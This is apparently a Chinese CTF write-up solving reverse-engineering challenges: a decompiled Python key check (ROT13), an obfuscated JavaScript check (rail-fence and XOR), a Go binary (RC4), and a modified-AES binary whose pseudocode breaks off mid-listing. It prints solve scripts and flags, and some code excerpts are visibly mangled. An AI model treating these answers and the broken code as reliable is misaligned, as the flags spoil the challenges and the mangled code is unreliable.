<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># --------duck.py----------</span></span><br><span class="line"><span class="comment"># uncompyle6 version 3.7.4</span></span><br><span class="line"><span class="comment"># Python bytecode 3.7 (3394)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 3.11.4 (tags/v3.11.4:d2340ef, Jun  7 2023, 05:45:37) [MSC v.1934 64 bit (AMD64)]</span></span><br><span class="line"><span class="comment"># Embedded file name: 1.py</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">arr = <span class="string">&#x27;~h|p4gs`gJdN`thPwR`jDn`te1w`2|RNH&#x27;</span></span><br><span class="line">arr = <span class="built_in">list</span>(arr)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;快帮帮小黄鸭，找到它的钥匙&#x27;</span>)</span><br><span class="line">a = <span class="built_in">input</span>(<span class="string">&#x27;请输入你找到的钥匙&gt;:&#x27;</span>)</span><br><span class="line">a = <span class="built_in">list</span>(a)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">ord</span>(a[<span class="number">0</span>]) != <span class="number">83</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(a[<span class="number">1</span>]) != <span class="number">89</span> <span class="keyword">or</span> <span class="built_in">ord</span>(a[<span class="number">2</span>]) != <span class="number">67</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;不对喔~&#x27;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    a = a[::-<span class="number">1</span>]</span><br><span class="line">    b = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">        <span class="keyword">if</span> a[i].isalpha():</span><br><span class="line">            c = a[i]</span><br><span class="line">            c = <span class="built_in">chr</span>(<span class="built_in">ord</span>(c) + <span class="number">13</span> - <span class="number">26</span> <span class="keyword">if</span> <span class="built_in">ord</span>(c) + <span class="number">13</span> &gt; (<span class="number">90</span> <span class="keyword">if</span> c &lt;= <span class="string">&#x27;Z&#x27;</span> <span class="keyword">else</span> <span class="number">122</span>) <span class="keyword">else</span> <span class="built_in">ord</span>(c) + <span class="number">13</span>)</span><br><span class="line">            b.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(c) + <span class="number">2</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            b.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(a[i]) + <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">chr</span>(<span class="built_in">ord</span>(a[<span class="number">1</span>])) != <span class="string">&#x27;s&#x27;</span> <span class="keyword">or</span> <span class="built_in">ord</span>(a[<span class="number">2</span>]) != <span class="number">109</span> <span class="keyword">or</span> <span class="built_in">chr</span>(<span class="built_in">ord</span>(a[<span class="number">17</span>])) != <span class="string">&#x27;C&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;呀呀呀，怎么算出来不对呀？&#x27;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(b)):</span><br><span class="line">        <span class="keyword">if</span> arr[i] == b[i]:</span><br><span class="line">            cnt += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> cnt == <span class="built_in">len</span>(b):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;密码正确啦！！！，快去告诉小黄鸭吧~&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;密码不对喔~，请再想想吧&#x27;</span>)</span><br><span class="line"><span class="comment"># okay decompiling 1.pyc</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>简单的ROT13加密 写出脚本解密</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key_o = <span class="string">&#x27;~h|p4gs`gJdN`thPwR`jDn`te1w`2|RNH&#x27;</span></span><br><span class="line">key_o = <span class="built_in">list</span>(key_o)</span><br><span class="line">key_o = key_o[::-<span class="number">1</span>]</span><br><span class="line">key = [<span class="built_in">ord</span>(val) <span class="keyword">for</span> val <span class="keyword">in</span> key_o]</span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> key:</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">chr</span>(each - <span class="number">2</span>).isalpha()):</span><br><span class="line">        c = each -<span class="number">2</span></span><br><span class="line">        c += <span class="number">13</span> <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) &lt;= c <span class="keyword">and</span> c &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;m&#x27;</span>) <span class="keyword">or</span> <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) &lt;= c <span class="keyword">and</span> c &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;M&#x27;</span>) <span class="keyword">else</span> (-<span class="number">13</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(c), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(each - <span class="number">1</span>), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># SYC&#123;1_h0pe_yOu_ChAse_YoUr_dr3ams&#125; 我Chase你的梦!</span></span><br></pre></td></tr></table></figure>

<h3 id="浪漫至死不渝-JS逆向"><a href="#浪漫至死不渝-JS逆向" class="headerlink" title="浪漫至死不渝 | JS逆向"></a>浪漫至死不渝 | JS逆向</h3><p>源码对变量名进行了混淆 去除混淆并对网页元素进行删去 得到主要逻辑</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">let</span> k=&#123;</span><br><span class="line">     <span class="attr">a</span>:<span class="number">0</span>,<span class="attr">b</span>:<span class="number">1</span>,<span class="attr">c</span>:<span class="number">2</span>,<span class="attr">d</span>:<span class="number">3</span>,<span class="attr">e</span>:<span class="number">4</span>,<span class="attr">f</span>:<span class="number">5</span>,<span class="attr">g</span>:<span class="number">6</span>,<span class="attr">h</span>:<span class="number">7</span>,<span class="attr">i</span>:<span class="number">8</span>,<span class="attr">j</span>:<span class="number">9</span>,<span class="attr">k</span>:<span class="number">10</span>,<span class="attr">l</span>:<span class="number">11</span>,<span class="attr">m</span>:<span class="number">12</span>,<span class="attr">n</span>:<span class="number">13</span>,<span class="attr">o</span>:<span class="number">14</span>,<span class="attr">p</span>:<span class="number">15</span>,<span class="attr">q</span>:<span class="number">16</span>,<span class="attr">r</span>:<span class="number">17</span>,<span class="attr">s</span>:<span class="number">18</span>,<span class="attr">t</span>:<span class="number">19</span>,<span class="attr">u</span>:<span class="number">20</span>,<span class="attr">v</span>:<span class="number">21</span>,<span class="attr">w</span>:<span class="number">22</span>,<span class="attr">x</span>:<span class="number">23</span>,<span class="attr">y</span>:<span class="number">24</span>,<span class="attr">z</span>:<span class="number">25</span>,</span><br><span class="line">     <span class="attr">A</span>:<span class="number">0</span>,<span class="attr">B</span>:<span class="number">1</span>,<span class="attr">C</span>:<span class="number">2</span>,<span class="attr">D</span>:<span class="number">3</span>,<span class="attr">E</span>:<span class="number">4</span>,<span class="attr">F</span>:<span class="number">5</span>,<span class="attr">G</span>:<span class="number">6</span>,<span class="attr">H</span>:<span class="number">7</span>,<span class="attr">I</span>:<span class="number">8</span>,<span class="attr">J</span>:<span class="number">9</span>,<span class="attr">K</span>:<span class="number">10</span>,<span class="attr">L</span>:<span class="number">11</span>,<span class="attr">M</span>:<span class="number">12</span>,<span class="attr">N</span>:<span class="number">13</span>,<span class="attr">O</span>:<span class="number">14</span>,<span class="attr">P</span>:<span class="number">15</span>,<span class="attr">Q</span>:<span class="number">16</span>,<span class="attr">R</span>:<span class="number">17</span>,<span class="attr">S</span>:<span class="number">18</span>,<span class="attr">T</span>:<span class="number">19</span>,<span class="attr">U</span>:<span class="number">20</span>,<span class="attr">V</span>:<span class="number">21</span>,<span class="attr">W</span>:<span class="number">22</span>,<span class="attr">X</span>:<span class="number">23</span>,<span class="attr">Y</span>:<span class="number">24</span>,<span class="attr">Z</span>:<span class="number">25</span></span><br><span class="line"> &#125; </span><br><span class="line"> <span class="keyword">let</span> a=[</span><br><span class="line">     &#123;<span class="attr">name</span>:<span class="string">&quot;A&quot;</span>,<span class="attr">yin</span>:<span class="number">7</span>, <span class="attr">str</span>:,</span><br><span class="line">     &#123;<span class="attr">name</span>:<span class="string">&quot;B&quot;</span> ,<span class="attr">yin</span>:<span class="number">24</span>, <span class="attr">str</span>:,</span><br><span class="line">     &#123;<span class="attr">name</span>:<span class="string">&quot;C&quot;</span> ,<span class="attr">yin</span>:<span class="number">1</span>, <span class="attr">str</span>:,</span><br><span class="line">     &#123;<span class="attr">name</span>:<span class="string">&quot;D&quot;</span> ,<span class="attr">yin</span>:<span class="number">4</span>, <span class="attr">str</span>:,</span><br><span class="line">     &#123;<span class="attr">name</span>:<span class="string">&quot;E&quot;</span> ,<span class="attr">yin</span>:<span class="number">5</span>, <span class="attr">str</span>:,</span><br><span class="line">     &#123;<span class="attr">name</span>:<span class="string">&quot;F&quot;</span> ,<span class="attr">yin</span>:<span class="number">2</span>, <span class="attr">str</span>:,</span><br><span class="line">     &#123;<span class="attr">name</span>:<span class="string">&quot;G&quot;</span> ,<span class="attr">yin</span>:<span class="number">6</span>, <span class="attr">str</span>:,</span><br><span class="line">     &#123;<span class="attr">name</span>:<span class="string">&quot;H&quot;</span> ,<span class="attr">yin</span>:<span class="number">5</span>, <span class="attr">str</span>:,</span><br><span class="line">     &#123;<span class="attr">name</span>:<span class="string">&quot;I&quot;</span> ,<span class="attr">yin</span>:<span class="number">8</span>, <span class="attr">str</span>:,</span><br><span class="line">     &#123;<span class="attr">name</span>:<span class="string">&quot;J&quot;</span> ,<span class="attr">yin</span>:<span class="number">3</span>, <span class="attr">str</span>:,</span><br><span class="line">     &#123;<span class="attr">name</span>:<span class="string">&quot;K&quot;</span> ,<span class="attr">yin</span>:<span class="number">9</span>, <span class="attr">str</span>:,</span><br><span class="line">     &#123;<span class="attr">name</span>:<span class="string">&quot;L&quot;</span> ,<span class="attr">yin</span>:<span class="number">8</span>, <span class="attr">str</span>:,</span><br><span class="line">     &#123;<span class="attr">name</span>:<span class="string">&quot;M&quot;</span> ,<span class="attr">yin</span>:<span class="number">11</span>, <span class="attr">str</span>:,</span><br><span class="line">     &#123;<span class="attr">name</span>:<span class="string">&quot;N&quot;</span> ,<span class="attr">yin</span>:<span class="number">3</span>, <span class="attr">str</span>:,</span><br><span class="line">     &#123;<span class="attr">name</span>:<span class="string">&quot;O&quot;</span> ,<span class="attr">yin</span>:<span class="number">7</span>, <span class="attr">str</span>:,</span><br><span class="line">     &#123;<span class="attr">name</span>:<span class="string">&quot;P&quot;</span> ,<span class="attr">yin</span>:<span class="number">14</span>, <span class="attr">str</span>:,</span><br><span class="line">     &#123;<span class="attr">name</span>:<span class="string">&quot;Q&quot;</span> ,<span class="attr">yin</span>:<span class="number">15</span>, <span class="attr">str</span>:,</span><br><span class="line">     &#123;<span class="attr">name</span>:<span class="string">&quot;R&quot;</span> ,<span class="attr">yin</span>:<span class="number">16</span>, <span class="attr">str</span>:,</span><br><span class="line">     &#123;<span class="attr">name</span>:<span class="string">&quot;S&quot;</span> ,<span class="attr">yin</span>:<span class="number">17</span>, <span class="attr">str</span>:,</span><br><span class="line">     &#123;<span class="attr">name</span>:<span class="string">&quot;T&quot;</span> ,<span class="attr">yin</span>:<span class="number">18</span>, <span class="attr">str</span>:,</span><br><span class="line">     &#123;<span class="attr">name</span>:<span class="string">&quot;U&quot;</span> ,<span class="attr">yin</span>:<span class="number">8</span>, <span class="attr">str</span>:,</span><br><span class="line">     &#123;<span class="attr">name</span>:<span class="string">&quot;V&quot;</span> ,<span class="attr">yin</span>:<span class="number">20</span>, <span class="attr">str</span>:,</span><br><span class="line">     &#123;<span class="attr">name</span>:<span class="string">&quot;W&quot;</span> ,<span class="attr">yin</span>:<span class="number">3</span>, <span class="attr">str</span>:,</span><br><span class="line">     &#123;<span class="attr">name</span>:<span class="string">&quot;X&quot;</span> ,<span class="attr">yin</span>:<span class="number">2</span>, <span class="attr">str</span>:,</span><br><span class="line">     &#123;<span class="attr">name</span>:<span class="string">&quot;Y&quot;</span> ,<span class="attr">yin</span>:<span class="number">23</span>, <span class="attr">str</span>:,</span><br><span class="line">     &#123;<span class="attr">name</span>:<span class="string">&quot;Z&quot;</span> ,<span class="attr">yin</span>:<span class="number">24</span>, <span class="attr">str</span>:</span><br><span class="line"> ];</span><br><span class="line">  </span><br><span class="line"><span class="keyword">let</span> target_2=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">let</span> key = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">125</span>, <span class="number">130</span>, <span class="number">131</span>, <span class="number">122</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">123</span>, <span class="number">125</span>, <span class="number">130</span>, <span class="number">131</span>, <span class="number">122</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">123</span>, <span class="number">99</span>, <span class="number">99</span>, <span class="number">99</span>, <span class="number">99</span>);</span><br><span class="line"><span class="keyword">let</span> s = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> target = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">function</span> <span class="title function_">fl</span>(<span class="params">e</span>)</span><br><span class="line"> &#123;</span><br><span class="line">     <span class="keyword">if</span>(clickb==<span class="literal">true</span>)</span><br><span class="line">     &#123;</span><br><span class="line">         <span class="keyword">const</span> num_of_fence = <span class="number">3</span>;</span><br><span class="line">         <span class="keyword">const</span> fence_key = <span class="string">&#x27;53X211WH04N&#x27;</span>;        </span><br><span class="line">         <span class="keyword">const</span> <span class="title class_">Text1</span> = <span class="title function_">decryptRailFence</span>(fence_key, num_of_fence);    <span class="comment">//Text1 = &#x27;510321H4XWN&#x27;</span></span><br><span class="line">        <span class="keyword">let</span> key = e.<span class="property">key</span>;</span><br><span class="line">     <span class="keyword">if</span>((key&lt;=<span class="string">&#x27;z&#x27;</span>&amp;&amp;key&gt;=<span class="string">&#x27;a&#x27;</span>)||(key&lt;=<span class="string">&#x27;Z&#x27;</span>&amp;&amp;key&gt;=<span class="string">&#x27;A&#x27;</span>))</span><br><span class="line">     &#123;</span><br><span class="line">         <span class="keyword">let</span> p=a[k[key]];</span><br><span class="line">         s += p.<span class="property">name</span>;</span><br><span class="line">         <span class="keyword">const</span> intArr = [];</span><br><span class="line">         <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; s.<span class="property">length</span>; i++)</span><br><span class="line">         &#123;</span><br><span class="line">             <span class="keyword">const</span> charCode = s.<span class="title function_">charCodeAt</span>(i);</span><br><span class="line">             intArr.<span class="title function_">push</span>(charCode);                <span class="comment">//intArr记录s中每个字符对应的ASCII值</span></span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">if</span> (s.<span class="property">length</span> % <span class="number">18</span> == <span class="number">0</span>)</span><br><span class="line">         &#123;</span><br><span class="line">             <span class="keyword">let</span> len = s.<span class="property">length</span> / <span class="number">18</span>;</span><br><span class="line">             <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">             &#123;</span><br><span class="line">                 <span class="keyword">for</span> (<span class="keyword">let</span> control = <span class="number">0</span>; control &lt; <span class="number">18</span>; control++)</span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">if</span> (control &lt; <span class="number">14</span>)</span><br><span class="line">                     &#123;</span><br><span class="line">                         intArr[i + control] ^= <span class="title class_">Text1</span>.<span class="title function_">charCodeAt</span>(control % <span class="number">7</span>);</span><br><span class="line">                         intArr[i + control] += <span class="number">10</span>;</span><br><span class="line">                     &#125;</span><br><span class="line">                     <span class="keyword">else</span></span><br><span class="line">                     &#123;</span><br><span class="line">                         intArr[i+ control] ^= <span class="title class_">Text1</span>.<span class="title function_">charCodeAt</span>(control -<span class="number">7</span>);</span><br><span class="line">                         intArr[i + control] += <span class="number">99</span>;</span><br><span class="line">                         &#125;</span><br><span class="line">                     &#125;</span><br><span class="line">            &#125;</span><br><span class="line">         <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; s.<span class="property">length</span>; i++)</span><br><span class="line">         &#123;</span><br><span class="line">            <span class="keyword">let</span> cnt = <span class="number">0</span>;</span><br><span class="line">             <span class="keyword">if</span> (intArr[i] == key[<span class="number">0</span>])</span><br><span class="line">             &#123;</span><br><span class="line">                 <span class="keyword">for</span> (<span class="keyword">let</span> control = <span class="number">0</span>; control &lt; key.<span class="property">length</span> &amp;&amp; i+ control &lt; intArr.<span class="property">length</span>; control++)</span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">if</span> (intArr[i + control] == key[control])</span><br><span class="line">                     &#123;</span><br><span class="line">                        cnt++;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">             &#125;</span><br><span class="line">             <span class="keyword">if</span> (cnt &gt;= <span class="number">18</span>) &#123;</span><br><span class="line">                target = <span class="literal">true</span>;</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line">             </span><br><span class="line">             </span><br><span class="line">        &#125;</span><br><span class="line">         <span class="keyword">if</span>(target&amp;&amp;target_2==<span class="number">0</span>)</span><br><span class="line">         &#123;</span><br><span class="line">             print <span class="string">&quot;ok&quot;</span></span><br><span class="line">     &#125;</span><br><span class="line">     &#125;  </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>主要是先用栅栏密码对key进行加密 然后对输入逐位字符进行加密 写出解密脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = [<span class="number">125</span>, <span class="number">130</span>, <span class="number">131</span>, <span class="number">122</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">123</span>, <span class="number">125</span>, <span class="number">130</span>, <span class="number">131</span>, <span class="number">122</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">123</span>, <span class="number">99</span>, <span class="number">99</span>, <span class="number">99</span>, <span class="number">99</span>]</span><br><span class="line">Text1 = <span class="string">&#x27;5201314WXHN&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">    <span class="keyword">if</span> i &lt; <span class="number">14</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>((key[i] - <span class="number">10</span>) ^ <span class="built_in">ord</span>(Text1[i % <span class="number">7</span>])), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>((key[i] - <span class="number">99</span>) ^ <span class="built_in">ord</span>(Text1[i - <span class="number">7</span>])), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># FJIAXUEFJIAXUEWXHN</span></span><br></pre></td></tr></table></figure>

<h3 id="寻找初音未来-Go语言逆向-一坨go史"><a href="#寻找初音未来-Go语言逆向-一坨go史" class="headerlink" title="寻找初音未来 | Go语言逆向 | 一坨go史"></a>寻找初音未来 | Go语言逆向 | 一坨go史</h3><p>go语言所有的字符串在内存上都是连续的 所以对一个字符串对应的长度和偏移量非常重要</p>
<p>附件放到虚拟机中打开 发现提示输入初音未来色 上网搜索知道是<code>39C5BB</code> 用IDA打开 发现这个输入通过某些加密算法得到key</p>
<p>再用该key进行RC4加密直接动态调试得到key为<code>CCCCCCCCCCCCCCCCCC</code> 用python内置的RC4解密算法进行解密</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"></span><br><span class="line">ciphertext = <span class="string">b&#x27;\x25\x6F\x3D\x6C\xF9\xE0\xCF\x3F\x2E\x24\xC6\x7B\x81\xBF\x55\x4F\x0D\x99\x87\x47\x48\xF7\xB9\x98\xFB\x1B\x22\xEC\x84\x23\xFD\xB2&#x27;</span></span><br><span class="line">key = <span class="string">b&#x27;CCCCCCCCCCCCCCCCCC&#x27;</span></span><br><span class="line"></span><br><span class="line">cipher = ARC4.new(key)</span><br><span class="line">plaintext = cipher.decrypt(ciphertext=ciphertext)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(plaintext)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;N0thing_1s_sEriOus_But_MIku&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="AES-AES-AES算法魔改"><a href="#AES-AES-AES算法魔改" class="headerlink" title="AES! AES? | AES算法魔改"></a>AES! AES? | AES算法魔改</h3><p>Exinfo查到无壳 64位win程序 IDA64打开 伪代码中看到核心加密逻辑是<code>Shiftrow()</code>和<code>transform()</code>伪代码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">ShiftRow</span><span class="params">(__int64 flag)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; i += <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; i / <span class="number">4</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = *(<span class="number">4</span>i64 * i + flag);</span><br><span class="line">      <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">2</span>; ++k )</span><br><span class="line">        *(<span class="number">4</span>i64 * (i + k) + flag) = *(flag + <span class="number">4</span> * (i + k + <span class="number">1</span>i64));</span><br><span class="line">      *(<span class="number">4</span>i64 * (i + k) + flag) = v1;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">__int64 __fastcall <span class="title function_">tansform</span><span class="params">(__int64 flag)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v2; <span class="comment">// dl</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  _DWORD *v4; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">int</span> v5[<span class="number">20</span>]; <span class="comment">// [rsp+0h] [rbp-60h]</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [rsp+50h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+54h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+5Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    v5[i] = *(<span class="number">4</span>i64 * i + flag);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">3</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">3</span>; ++k )</span><br><span class="line">    &#123;</span><br><span class="line">      *(flag + <span class="number">4</span>i64 * v9) = v5[<span class="number">4</span> * k + j];</span><br><span class="line">      v2 = S[*(<span class="number">4</span>i64 * v9 + flag)];</span><br><span class="line">      v3 = v9++;</span><br><span class="line">      v4 = (flag + <span class="number">4</span>i64 * v3);</span><br><span class="line">      result = v2;</span><br><span class="line">      *v4 = v2;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 整体代码如下 其中还有一个异或加密 用来实现AES算法</span></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> Str[<span class="number">48</span>]; <span class="comment">// [rsp+20h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">int</span> flag1[<span class="number">16</span>]; <span class="comment">// [rsp+50h] [rbp-30h] BYREF</span></span><br><span class="line">  _BYTE flag2[<span class="number">96</span>]; <span class="comment">// [rsp+90h] [rbp+10h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">8</span>]; <span class="comment">// [rsp+F0h] [rbp+70h] BYREF</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+F8h] [rbp+78h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+100h] [rbp+80h]</span></span><br><span class="line">  <span class="type">char</span> v10[<span class="number">20</span>]; <span class="comment">// [rsp+110h] [rbp+90h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v11[<span class="number">15</span>]; <span class="comment">// [rsp+124h] [rbp+A4h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v12[<span class="number">13</span>]; <span class="comment">// [rsp+133h] [rbp+B3h] BYREF</span></span><br><span class="line">  __int64 v13[<span class="number">3</span>]; <span class="comment">// [rsp+140h] [rbp+C0h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [rsp+158h] [rbp+D8h]</span></span><br><span class="line">  __int16 v15; <span class="comment">// [rsp+15Ch] [rbp+DCh]</span></span><br><span class="line">  <span class="type">char</span> v16[<span class="number">16</span>]; <span class="comment">// [rsp+160h] [rbp+E0h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v17[<span class="number">40</span>]; <span class="comment">// [rsp+170h] [rbp+F0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v18[<span class="number">176</span>]; <span class="comment">// [rsp+210h] [rbp+190h] BYREF</span></span><br><span class="line">  __int16 v19; <span class="comment">// [rsp+2C0h] [rbp+240h]</span></span><br><span class="line">  <span class="type">char</span> v20; <span class="comment">// [rsp+2C2h] [rbp+242h]</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// [rsp+2C4h] [rbp+244h]</span></span><br><span class="line">  <span class="type">int</span> _32; <span class="comment">// [rsp+2C8h] [rbp+248h]</span></span><br><span class="line">  <span class="type">int</span> i2; <span class="comment">// [rsp+2CCh] [rbp+24Ch]</span></span><br><span class="line">  <span class="type">int</span> cnt; <span class="comment">// [rsp+2D0h] [rbp+250h]</span></span><br><span class="line">  <span class="type">int</span> i1; <span class="comment">// [rsp+2D4h] [rbp+254h]</span></span><br><span class="line">  <span class="type">int</span> nn; <span class="comment">// [rsp+2D8h] [rbp+258h]</span></span><br><span class="line">  <span class="type">int</span> mm; <span class="comment">// [rsp+2DCh] [rbp+25Ch]</span></span><br><span class="line">  <span class="type">int</span> jj; <span class="comment">// [rsp+2E0h] [rbp+260h]</span></span><br><span class="line">  <span class="type">int</span> kk; <span class="comment">// [rsp+2E4h] [rbp+264h]</span></span><br><span class="line">  <span class="type">int</span> ii; <span class="comment">// [rsp+2E8h] [rbp+268h]</span></span><br><span class="line">  <span class="type">int</span> n; <span class="comment">// [rsp+2ECh] [rbp+26Ch]</span></span><br><span class="line">  <span class="type">int</span> m; <span class="comment">// [rsp+2F0h] [rbp+270h]</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [rsp+2F4h] [rbp+274h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+2F8h] [rbp+278h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+2FCh] [rbp+27Ch]</span></span><br><span class="line"></span><br><span class="line">  (_main)(argc, argv, envp);</span><br><span class="line">  <span class="built_in">memset</span>(v18, <span class="number">0</span>, <span class="keyword">sizeof</span>(v18));</span><br><span class="line">  v19 = <span class="number">0</span>;</span><br><span class="line">  v20 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v17, <span class="number">0</span>, <span class="keyword">sizeof</span>(v17));</span><br><span class="line">  v17[<span class="number">0</span>] = <span class="number">0xE0</span>;</span><br><span class="line">  v17[<span class="number">1</span>] = <span class="number">0xFFFFFF05</span>;</span><br><span class="line">  v17[<span class="number">2</span>] = <span class="number">0xFFFFFF6E</span>;</span><br><span class="line">  v17[<span class="number">3</span>] = <span class="number">0xFFFFFFC2</span>;</span><br><span class="line">  v17[<span class="number">4</span>] = <span class="number">0xFFFFFF6E</span>;</span><br><span class="line">  v17[<span class="number">5</span>] = <span class="number">0xFFFFFF99</span>;</span><br><span class="line">  v17[<span class="number">6</span>] = <span class="number">0xFFFFFF68</span>;</span><br><span class="line">  v17[<span 